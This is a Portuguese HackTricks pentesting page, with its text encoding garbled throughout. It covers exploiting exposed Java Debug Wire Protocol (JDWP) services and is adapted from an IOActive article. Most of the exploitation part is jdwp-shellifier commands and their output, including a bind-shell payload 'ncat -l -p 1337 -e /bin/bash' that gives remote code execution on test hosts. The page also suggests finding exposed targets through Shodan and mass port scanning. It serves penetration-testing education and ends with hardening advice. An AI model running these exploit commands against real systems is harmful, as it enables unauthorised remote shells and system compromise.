<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- VocÃª trabalha em uma **empresa de seguranÃ§a cibernÃ©tica**? VocÃª quer ver sua **empresa anunciada no HackTricks**? ou vocÃª quer ter acesso Ã  **Ãºltima versÃ£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A FamÃ­lia PEASS**](https://opensea.io/collection/the-peass-family), nossa coleÃ§Ã£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe suas tÃ©cnicas de hacking enviando PRs para o [repositÃ³rio hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


# Explorando

VocÃª pode usar o exploit em python localizado em [https://github.com/IOActive/jdwp-shellifier](https://github.com/IOActive/jdwp-shellifier)
```bash
./jdwp-shellifier.py -t 192.168.2.9 -p 8000 #Obtain internal data
./jdwp-shellifier.py -t 192.168.2.9 -p 8000 --cmd 'ncat -l -p 1337 -e /bin/bash' #Exec something
./jdwp-shellifier.py -t 192.168.2.9 -p 8000 --break-on 'java.lang.String.indexOf' --cmd 'ncat -l -p 1337 -e /bin/bash' #Uses java.lang.String.indexOf as breakpoint instead of java.net.ServerSocket.accept
```
Descobri que o uso de `--break-on 'java.lang.String.indexOf'` torna o exploit mais **estÃ¡vel**. E se vocÃª tiver a chance de fazer upload de uma backdoor para o host e executÃ¡-la em vez de executar um comando, o exploit serÃ¡ ainda mais estÃ¡vel.

Normalmente, esse depurador Ã© executado na porta 8000 e, se vocÃª estabelecer uma conexÃ£o TCP com a porta e enviar "**JDWP-Handshake**", o servidor deve responder com a mesma string.\
AlÃ©m disso, vocÃª pode verificar essa string na rede para encontrar possÃ­veis serviÃ§os JDWP.

Listando **processos**, se vocÃª encontrar a string "**jdwk**" dentro de um **processo java**, provavelmente ele tem ativo o **Java Debug Wired Protocol** e vocÃª pode ser capaz de se mover lateralmente ou atÃ© mesmo **escalar privilÃ©gios** (se executado como root).

# Mais detalhes

**Copiado de** [**https://ioactive.com/hacking-java-debug-wire-protocol-or-how/**](https://ioactive.com/hacking-java-debug-wire-protocol-or-how/)

## **Java Debug Wire Protocol**

**Java Platform Debug Architecture (JPDA)**: JDWP Ã© um componente do sistema global de depuraÃ§Ã£o Java, chamado de Java Platform Debug Architecture (JPDA)\[2]. O seguinte Ã© um diagrama da arquitetura geral:

[![](https://ioactive.com/wp-content/uploads/2014/04/jdpa.png)](https://ioactive.com/wp-content/uploads/2014/04/jdpa-1.png)

O Debuggee consiste em uma JVM com vÃ¡rias threads executando nossa aplicaÃ§Ã£o de destino. Para ser remotamente depurÃ¡vel, a instÃ¢ncia JVM deve ser explicitamente iniciada com a opÃ§Ã£o -Xdebug passada na linha de comando, bem como a opÃ§Ã£o -Xrunjdwp (ou -agentlib). Por exemplo, iniciar um servidor Tomcat com depuraÃ§Ã£o remota habilitada ficaria assim:

[![](https://ioactive.com/wp-content/uploads/2014/04/tomat.png)](https://ioactive.com/wp-content/uploads/2014/04/tomat-1.png)

Como mostrado no diagrama da arquitetura, o Java Debug Wire Protocol Ã© o link central entre o Debugger e a instÃ¢ncia JVM. ObservaÃ§Ãµes sobre o protocolo incluem:

* Ã‰ um protocolo binÃ¡rio de rede baseado em pacotes.
* Ã‰ principalmente sÃ­ncrono. O depurador envia um comando sobre JDWP e espera receber uma resposta. No entanto, alguns comandos, como Eventos, nÃ£o esperam uma resposta sÃ­ncrona. Eles enviarÃ£o uma resposta quando condiÃ§Ãµes especÃ­ficas forem atendidas. Por exemplo, um BreakPoint Ã© um Evento.
* NÃ£o usa autenticaÃ§Ã£o.
* NÃ£o usa criptografia.

Todas essas observaÃ§Ãµes fazem total sentido, uma vez que estamos falando de um protocolo de depuraÃ§Ã£o. No entanto, quando um serviÃ§o desse tipo Ã© exposto a uma rede hostil ou estÃ¡ voltado para a Internet, as coisas podem dar errado.\
\
**Handshake**: JDWP dita\[9] que a comunicaÃ§Ã£o deve ser iniciada por um simples handshake. ApÃ³s uma conexÃ£o TCP bem-sucedida, o Debugger (cliente) envia a string ASCII de 14 caracteres "JDWP-Handshake". O Debuggee (servidor) responde a esta mensagem enviando exatamente a mesma string. O seguinte rastreamento scapy\[3] mostra o handshake inicial de duas vias:

root:\~/tools/scapy-hg # ip addr show dev eth0 | grep â€œinet â€œ inet 192.168.2.2/24 brd 192.168.2.255 scope global eth0root:\~/tools/scapy-hg # ./run\_scapy

Welcome to Scapy (2.2.0-dev)\
**>>>** sniff(filter=â€tcp port 8000 and host 192.168.2.9â€³, count=8)\
\<Sniffed: TCP:9 UDP:1 ICMP:0 Other:0>\
**>>>** tcp.hexraw()\
0000 15:49:30.397814 Ether / IP / TCP 192.168.2.2:59079 > 192.168.2.9:8000 S\
0001 15:49:30.402445 Ether / IP / TCP 192.168.2.9:8000 > 192.168.2.2:59079 SA\
0002 15:49:30.402508 Ether / IP / TCP 192.168.2.2:59079 > 192.168.2.9:8000 A\
0003 15:49:30.402601 Ether / IP / TCP 192.168.2.2:59079 > 192.168.2.9:8000 PA / Raw\
**0000 4A 44 57 50 2D 48 61 6E 64 73 68 61 6B 65 JDWP-Handshake**\
0004 15:49:30.407553 Ether / IP / TCP 192.168.2.9:8000 > 192.168.2.2:59079 A\
0005 15:49:30.407557 Ether / IP / TCP 192.168.2.9:8000 > 192.168.2.2:59079 A\
0006 15:49:30.407557 Ether / IP / TCP 192.168.2.9:8000 > 192.168.2.2:59079 PA / Raw\
**0000 4A 44 57 50 2D 48 61 6E 64 73 68 61 6B 65 JDWP-Handshake**\
0007 15:49:30.407636 Ether /
```
hugsy:~/labs % python2 jdwp-shellifier.py -t 192.168.2.9 
[+] Targeting â€˜192.168.2.9:8000â€™
[+] Reading settings for â€˜Java HotSpot(TM) 64-Bit Server VM â€“ 1.6.0_65â€™
[+] Found Runtime class: id=466[+] Found Runtime.getRuntime(): id=7facdb6a8038
[+] Created break event id=2
[+] Waiting for an event on â€˜java.net.ServerSocket.acceptâ€™## Here we wait for breakpoint to be triggered by a new connection ##
[+] Received matching event from thread 0x8b0
[+] Found Operating System â€˜Mac OS Xâ€™
[+] Found User name â€˜pentestosxâ€™
[+] Found ClassPath â€˜/Users/pentestosx/Desktop/apache-tomcat-6.0.39/bin/bootstrap.jarâ€™
[+] Found User home directory â€˜/Users/pentestosxâ€™
[!] Command successfully executed
```
Mesma linha de comando, mas contra um sistema Windows e interrompendo em um mÃ©todo totalmente diferente:
```
hugsy:~/labs % python2 jdwp-shellifier.py -t 192.168.2.8 â€“break-on â€˜java.lang.String.indexOfâ€™
[+] Targeting â€˜192.168.2.8:8000â€™
[+] Reading settings for â€˜Java HotSpot(TM) Client VM â€“ 1.7.0_51â€™
[+] Found Runtime class: id=593
[+] Found Runtime.getRuntime(): id=17977a9c
[+] Created break event id=2
[+] Waiting for an event on â€˜java.lang.String.indexOfâ€™
[+] Received matching event from thread 0x8f5
[+] Found Operating System â€˜Windows 7â€™
[+] Found User name â€˜hugsyâ€™
[+] Found ClassPath â€˜C:UsershugsyDesktopapache-tomcat-6.0.39binbootstrap.jarâ€™
[+] Found User home directory â€˜C:Usershugsyâ€™
[!] Command successfully executed
```
Executamos nosso exploit para gerar um shell de bind com o payload "ncat -e /bin/bash -l -p 1337", contra um sistema Linux:
```
hugsy:~/labs % python2 jdwp-shellifier.py -t 192.168.2.8 â€“cmd â€˜ncat -l -p 1337 -e /bin/bashâ€™
[+] Targeting â€˜192.168.2.8:8000â€™
[+] Reading settings for â€˜OpenJDK Client VM â€“ 1.6.0_27â€™
[+] Found Runtime class: id=79d
[+] Found Runtime.getRuntime(): id=8a1f5e0
[+] Created break event id=2
[+] Waiting for an event on â€˜java.net.ServerSocket.acceptâ€™
[+] Received matching event from thread 0x82a[+] Selected payload â€˜ncat -l -p 1337 -e /bin/bashâ€™
[+] Command string object created id:82b
[+] Runtime.getRuntime() returned context id:0x82c
[+] found Runtime.exec(): id=8a1f5fc[+] Runtime.exec() successful, retId=82d
[!] Command successfully executed Success, we now have a listening socket!
root@pwnbox:~/apache-tomcat-6.0.39# netstat -ntpl | grep 1337
tcp        0      0 0.0.0.0:1337         0.0.0.0:*               LISTEN      19242/ncat      
tcp6       0      0 :::1337              :::*                    LISTEN      19242/ncat     
```
O exploit final utiliza essas tÃ©cnicas, adiciona algumas verificaÃ§Ãµes e envia sinais de suspensÃ£o / retomada para causar o mÃ­nimo de interrupÃ§Ã£o possÃ­vel (Ã© sempre melhor nÃ£o quebrar a aplicaÃ§Ã£o em que vocÃª estÃ¡ trabalhando, certo?). Ele age em dois modos:

* O modo "PadrÃ£o" Ã© totalmente nÃ£o intrusivo e simplesmente executa cÃ³digo Java para obter informaÃ§Ãµes do sistema local (perfeito para um PoC para um cliente).
* Passando a opÃ§Ã£o "cmd" executa um comando do sistema no host remoto e, portanto, Ã© mais intrusivo. O comando Ã© executado com os privilÃ©gios com os quais o JVM estÃ¡ sendo executado.

Este script de exploit foi testado com sucesso em:

* Oracle Java JDK 1.6 e 1.7
* OpenJDK 1.6
* IBM JDK 1.6

Como o Java Ã© projetado para ser independente de plataforma, os comandos podem ser executados em qualquer sistema operacional que o Java suporte. Bem, isso Ã© realmente uma boa notÃ­cia para nÃ³s, pentesters: **o serviÃ§o JDWP aberto significa RCE confiÃ¡vel**. AtÃ© agora, tudo bem.

## **E quanto Ã  exploraÃ§Ã£o na vida real?**

Na verdade, o JDWP Ã© bastante usado no mundo das aplicaÃ§Ãµes Java. No entanto, os pentesters podem nÃ£o vÃª-lo com tanta frequÃªncia ao realizar avaliaÃ§Ãµes remotas, pois os firewalls bloqueariam (e deveriam) a porta em que ele estÃ¡ sendo executado. Mas isso nÃ£o significa que o JDWP nÃ£o possa ser encontrado na natureza:

* No momento em que este artigo foi escrito, uma pesquisa rÃ¡pida no ShodanHQ\[4] revelou imediatamente cerca de 40 servidores enviando o handshake JDWP:

![](https://ioactive.com/wp-content/uploads/2014/04/shodan.png)

Isso Ã© realmente uma descoberta interessante porque, como vimos antes, Ã© suposto ser o lado do cliente (depurador) que inicia o diÃ¡logo.

* O GitHub\[7] tambÃ©m revela um nÃºmero significativo de aplicativos de cÃ³digo aberto potencialmente vulnerÃ¡veis:

![](https://ioactive.com/wp-content/uploads/2014/04/github.png)

* A varredura em massa da Internet em busca de portas especÃ­ficas (tcp/8000, tcp/8080, tcp/8787, tcp/5005) revelou muitos hosts (que nÃ£o podem ser relatados aqui) respondendo ao handshake inicial.
* AplicaÃ§Ãµes "Enterprise" foram encontradas na natureza executando um serviÃ§o JDWP \*por padrÃ£o\* (encontrar o nÃºmero da porta real Ã© deixado como um exercÃ­cio para o leitor curioso).

Essas sÃ£o apenas algumas maneiras de descobrir serviÃ§os JDWP abertos na Internet. Isso Ã© um Ã³timo lembrete de que as aplicaÃ§Ãµes devem passar regularmente por revisÃµes de seguranÃ§a minuciosas, os ambientes de produÃ§Ã£o devem ter qualquer funcionalidade de depuraÃ§Ã£o desativada e os firewalls devem ser configurados para restringir o acesso a serviÃ§os necessÃ¡rios apenas para operaÃ§Ã£o normal. Permitir que qualquer pessoa se conecte a um serviÃ§o JDWP Ã© exatamente o mesmo que permitir uma conexÃ£o a um serviÃ§o gdbserver (de uma maneira mais estÃ¡vel). Espero que vocÃª tenha gostado de ler este artigo tanto quanto eu gostei de brincar com JDWP. Para todos os poderosos piratas, feliz JDWP pwning !!

**Obrigado**\
\
Gostaria de agradecer a Ilja Van Sprundel e Sebastien Macke por suas ideias e testes.

## **ReferÃªncias:**

1. [https://github.com/IOActive/jdwp-shellifier](https://github.com/IOActive/jdwp-shellifier)
2. [http://docs.oracle.com/javase/7/docs/technotes/guides/jpda/architecture.html](http://docs.oracle.com/javase/7/docs/technotes/guides/jpda/architecture.html)
3. http://www.secdev.org/projects/scapy(nÃ£o mais ativo)
4. [http://www.shodanhq.com/search?q=JDWP-HANDSHAKE](http://www.shodanhq.com/search?q=JDWP-HANDSHAKE)
5. http://www.hsc-news.com/archives/2013/000109.html (nÃ£o mais ativo)
6. [http://packetstormsecurity.com/files/download/122525/JDWP-exploitation.txt](http://packetstormsecurity.com/files/download/122525/JDWP-exploitation.txt)
7. https://github.com/search?q=-Xdebug+-Xrunjdwp\&type=Code\&ref=searchresults
8. [http://docs.oracle.com/javase/6/docs/api/java/lang/Runtime.html](http://docs.oracle.com/javase/6/docs/api/java/lang/Runtime.html)
9. [http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp-spec.html](http://docs.oracle.com)
10. [http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html](http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html)
11. [http://nmap.org/nsedoc/scripts/jdwp-exec.html](http://nmap.org/nsedoc/scripts/jdwp-exec.html)


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- VocÃª trabalha em uma **empresa de ciberseguranÃ§a**? VocÃª quer ver sua **empresa anunciada no HackTricks**? ou vocÃª quer ter acesso Ã  **Ãºltima versÃ£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A FamÃ­lia PEASS**](https://opensea.io/collection/the-peass-family), nossa coleÃ§Ã£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe seus truques de hacking enviando PRs para o [repositÃ³rio hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
